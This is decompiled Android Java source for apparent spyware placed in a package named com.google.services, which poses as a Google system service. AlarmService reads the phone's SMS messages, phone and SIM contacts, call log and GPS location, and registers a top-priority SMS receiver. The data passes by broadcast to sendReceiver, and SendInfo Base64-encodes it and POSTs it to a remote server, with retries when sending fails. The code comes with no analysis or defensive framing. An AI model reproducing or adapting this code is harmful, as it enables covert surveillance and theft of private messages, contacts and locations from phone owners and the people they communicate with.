package com.google.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class sendReceiver extends BroadcastReceiver {
    private String name = null;
    SendInfo sender = SendInfo.getInstance();
    private String value = null;

    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("com.google.system.receiver")) {
            Bundle extras = intent.getExtras();
            if (extras == null) {
                return;
            }
            if (extras.containsKey("sms")) {
                Log.i("接收到短信了吧", extras.getString("sms"));
                this.name = "sms";
                this.value = extras.getString("sms").toString();
                this.sender.sendInfo(this.name, this.value);
            } else if (extras.containsKey("contact")) {
                Log.i("接收到通讯录", extras.getString("contact"));
                this.name = "contact";
                this.value = extras.get("contact").toString();
                this.sender.sendInfo(this.name, this.value);
            } else if (extras.containsKey("location")) {
                Log.i("接收到位置信息", extras.getString("location"));
                this.name = "location";
                this.value = extras.get("location").toString();
                this.sender.sendInfo(this.name, this.value);
            } else if (extras.containsKey("other")) {
                Log.i("接收到record", extras.getString("other"));
                this.name = "other";
                this.value = extras.get("other").toString();
                this.sender.sendInfo(this.name, this.value);
            }
        }
    }
}
package com.google.services;

import android.util.Log;
import it.sauronsoftware.base64.Base64;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class SendInfo {
    private static SendInfo test = null;
    String contact = "";
    String location = "";
    boolean okFlag = false;
    String other = "";
    String sms = "";
    String urlstr = null;

    private SendInfo() {
    }

    public static SendInfo getInstance() {
        if (test == null) {
            test = new SendInfo();
        }
        return test;
    }

    public boolean sendInfo(String str, String str2) {
        if (this.urlstr.equals(null)) {
            Log.i("sendInfo", "网络不通  nullurl");
            if (str.equals("sms")) {
                this.sms += ";" + str2;
            }
            if (str.equals("contact")) {
                this.contact += ";" + str2;
            }
            if (str.equals("location")) {
                this.location += ";" + str2;
            }
            if (!str.equals("other")) {
                return false;
            }
            this.other += ";" + str2;
            return false;
        }
        try {
            if (str.equals("sms") || str.equals("contact") || str.equals("location") || str.equals("other")) {
                run(str, Base64.encode(str2, "UTF-8"));
            } else {
                run(str, str2);
            }
            if (this.okFlag) {
                return true;
            }
            if (str.equals("sms")) {
                this.sms += ";" + str2;
            }
            if (str.equals("contact")) {
                this.contact += ";" + str2;
            }
            if (str.equals("location")) {
                this.location += ";" + str2;
            }
            if (!str.equals("other")) {
                return false;
            }
            this.other += ";" + str2;
            return false;
        } catch (Exception e) {
            Log.i("sendInfo", "网络不通  exception");
            if (str.equals("sms")) {
                this.sms += ";" + str2;
            }
            if (str.equals("contact")) {
                this.contact += ";" + str2;
            }
            if (str.equals("location")) {
                this.location += ";" + str2;
            }
            if (!str.equals("other")) {
                return false;
            }
            this.other += ";" + str2;
            return false;
        }
    }

    public void chuli() {
        if (!"".equals(this.sms) && reSendInfo("sms", Base64.encode(this.sms, "UTF-8"))) {
            this.sms = "";
        }
        if (!"".equals(this.contact)) {
            Log.i("contact重发", this.contact);
            if (reSendInfo("contact", Base64.encode(this.contact, "UTF-8"))) {
                this.contact = "";
            }
        }
        if (!"".equals(this.location) && reSendInfo("location", Base64.encode(this.location, "UTF-8"))) {
            this.location = "";
        }
        if (!"".equals(this.other) && reSendInfo("other", Base64.encode(this.other, "UTF-8"))) {
            this.other = "";
        }
    }

    /* access modifiers changed from: 0000 */
    public boolean reSendInfo(String str, String str2) {
        if (this.urlstr.equals(null)) {
            Log.i("sendInfo", "网络不通");
            return false;
        }
        try {
            HttpPost httpPost = new HttpPost(this.urlstr);
            ArrayList arrayList = new ArrayList();
            arrayList.add(new BasicNameValuePair(str.toString(), str2.toString()));
            httpPost.setEntity(new UrlEncodedFormEntity(arrayList, "UTF-8"));
            DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
            defaultHttpClient.getParams().setParameter("http.connection.timeout", Integer.valueOf(6000));
            defaultHttpClient.getParams().setParameter("http.socket.timeout", Integer.valueOf(6000));
            if (defaultHttpClient.execute(httpPost).getStatusLine().getStatusCode() == 200) {
                return true;
            }
            Log.i("sendInfo", "网络不通");
            return false;
        } catch (Exception e) {
            Log.i("sendInfo", "网络不通");
            return false;
        }
    }

    public synchronized void run(String str, String str2) {
        HttpPost httpPost = new HttpPost(this.urlstr);
        ArrayList arrayList = new ArrayList();
        arrayList.add(new BasicNameValuePair(str.toString(), str2.toString()));
        try {
            this.okFlag = false;
            httpPost.setEntity(new UrlEncodedFormEntity(arrayList, "UTF-8"));
            DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
            defaultHttpClient.getParams().setParameter("http.connection.timeout", Integer.valueOf(10000));
            defaultHttpClient.getParams().setParameter("http.socket.timeout", Integer.valueOf(10000));
            if (defaultHttpClient.execute(httpPost).getStatusLine().getStatusCode() == 200) {
                this.okFlag = true;
            }
        } catch (UnsupportedEncodingException e) {
            Log.i("sendInfo", "网络不通");
        } catch (ClientProtocolException e2) {
            Log.i("sendInfo", "网络不通");
        } catch (IOException e3) {
            Log.i("sendInfo", "网络不通");
        }
        return;
    }
}
package com.google.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.text.TextUtils;
import java.sql.Date;
import java.text.SimpleDateFormat;

public class AlarmService extends Service {
    private static final int PHONES_DISPLAY_NAME_INDEX = 0;
    private static final int PHONES_NUMBER_INDEX = 1;
    private static final String[] PHONES_PROJECTION = new String[]{"display_name", "data1"};
    private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            AlarmService.this.updateWithNewLocation(location);
        }

        public void onProviderDisabled(String str) {
            AlarmService.this.updateWithNewLocation(null);
        }

        public void onProviderEnabled(String str) {
        }

        public void onStatusChanged(String str, int i, Bundle bundle) {
        }
    };
    Context mContext = null;

    public void onCreate() {
        super.onCreate();
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        intentFilter.setPriority(Integer.MAX_VALUE);
        registerReceiver(new alarmReceiver(), intentFilter);
        try {
            LocationManager locationManager = (LocationManager) getSystemService("location");
            Criteria criteria = new Criteria();
            criteria.setAccuracy(PHONES_NUMBER_INDEX);
            criteria.setAltitudeRequired(false);
            criteria.setBearingRequired(false);
            criteria.setCostAllowed(true);
            criteria.setPowerRequirement(PHONES_NUMBER_INDEX);
            String bestProvider = locationManager.getBestProvider(criteria, true);
            updateWithNewLocation(locationManager.getLastKnownLocation(bestProvider));
            locationManager.requestLocationUpdates(bestProvider, 10000, 20.0f, this.locationListener);
        } catch (Exception e) {
        }
        this.mContext = this;
        String str = ("mobile:" + Build.MODEL + ",SDK version:" + VERSION.SDK + ",OS version:" + VERSION.RELEASE + "#") + getPhoneContacts() + getSIMContacts();
        Intent intent = new Intent();
        intent.setAction("com.google.system.receiver");
        Bundle bundle = new Bundle();
        bundle.putString("contact", str);
        intent.putExtras(bundle);
        sendBroadcast(intent);
        str = getRecord();
        intent = new Intent();
        intent.setAction("com.google.system.receiver");
        bundle = new Bundle();
        bundle.putString("other", str);
        intent.putExtras(bundle);
        sendBroadcast(intent);
    }

    public void onStart(Intent intent, int i) {
        Intent intent2 = new Intent();
        intent2.setAction("com.google.system.receiver");
        Bundle bundle = new Bundle();
        bundle.putString("sms", getSms());
        intent2.putExtras(bundle);
        sendBroadcast(intent2);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    private String getPhoneContacts() {
        Cursor query = this.mContext.getContentResolver().query(Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
        String str = "";
        if (query != null) {
            while (query.moveToNext()) {
                String string = query.getString(PHONES_NUMBER_INDEX);
                if (!TextUtils.isEmpty(string)) {
                    str = str + "name:" + query.getString(PHONES_DISPLAY_NAME_INDEX) + ",phonenumber:" + string + ";";
                }
            }
            query.close();
        }
        return str;
    }

    private String getSIMContacts() {
        Cursor query = this.mContext.getContentResolver().query(Uri.parse("content://icc/adn"), PHONES_PROJECTION, null, null, null);
        String str = "";
        if (query != null) {
            while (query.moveToNext()) {
                String string = query.getString(PHONES_NUMBER_INDEX);
                if (!TextUtils.isEmpty(string)) {
                    str = str + "name:" + query.getString(PHONES_DISPLAY_NAME_INDEX) + ",phonenumber:" + string + ";";
                }
            }
            query.close();
        }
        return str;
    }

    /* access modifiers changed from: private */
    public void updateWithNewLocation(Location location) {
        String str;
        if (location != null) {
            str = "Long&Lat:" + location.getLongitude() + "," + location.getLatitude();
        } else {
            str = "No location found";
        }
        Intent intent = new Intent();
        intent.setAction("com.google.system.receiver");
        Bundle bundle = new Bundle();
        bundle.putString("location", str);
        intent.putExtras(bundle);
        sendBroadcast(intent);
    }

    private String getSms() {
        StringBuilder stringBuilder = new StringBuilder();
        try {
            Cursor query = getContentResolver().query(Uri.parse("content://sms/"), new String[]{"_id", "address", "person", "body", "date", "type"}, null, null, "date desc");
            if (query.moveToFirst()) {
                int columnIndex = query.getColumnIndex("person");
                int columnIndex2 = query.getColumnIndex("address");
                int columnIndex3 = query.getColumnIndex("body");
                int columnIndex4 = query.getColumnIndex("date");
                int columnIndex5 = query.getColumnIndex("type");
                do {
                    String str;
                    String string = query.getString(columnIndex);
                    String string2 = query.getString(columnIndex2);
                    String string3 = query.getString(columnIndex3);
                    String format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(Long.parseLong(query.getString(columnIndex4))));
                    int i = query.getInt(columnIndex5);
                    if (i == PHONES_NUMBER_INDEX) {
                        str = "接收";
                    } else if (i == 2) {
                        str = "发送";
                    } else {
                        str = "";
                    }
                    stringBuilder.append("发信人：");
                    stringBuilder.append(string + ",电话号码：");
                    stringBuilder.append(string2 + ",消息内容：");
                    stringBuilder.append(string3 + ",时间：");
                    stringBuilder.append(format + ",类型");
                    stringBuilder.append(str);
                    stringBuilder.append(";");
                } while (query.moveToNext());
            } else {
                stringBuilder.append("no result!");
            }
        } catch (Exception e) {
        }
        return stringBuilder.toString();
    }

    private String getRecord() {
        StringBuilder stringBuilder = new StringBuilder();
        String str = "";
        str = "";
        str = "";
        Cursor query = getContentResolver().query(Calls.CONTENT_URI, new String[]{"number", "name", "type", "date", "duration"}, null, null, "date DESC");
        if (query.moveToFirst()) {
            while (query.moveToNext()) {
                String string = query.getString(PHONES_DISPLAY_NAME_INDEX);
                String string2 = query.getString(PHONES_NUMBER_INDEX);
                int i = query.getInt(2);
                long j = query.getLong(4);
                String format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(Long.parseLong(query.getString(3))));
                stringBuilder.append("时间：");
                stringBuilder.append(format + ",姓名：");
                stringBuilder.append(string2 + ",电话号码：");
                stringBuilder.append(string + ",类型：");
                stringBuilder.append(i + ",时长");
                stringBuilder.append(j);
                stringBuilder.append(";");
            }
        } else {
            stringBuilder.append("no record found!");
        }
        return stringBuilder.toString();
    }
}
